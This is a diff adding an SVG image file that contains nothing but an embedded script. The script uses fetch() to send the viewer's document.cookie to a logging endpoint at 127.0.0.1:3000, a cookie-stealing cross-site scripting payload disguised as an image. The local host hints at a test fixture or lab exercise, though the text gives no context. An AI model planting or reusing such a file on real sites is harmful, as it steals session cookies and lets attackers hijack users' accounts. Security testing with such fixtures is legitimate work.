@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('http://127.0.0.1:3000/log?cookie=' + document.cookie);
+  </script>
+</svg>
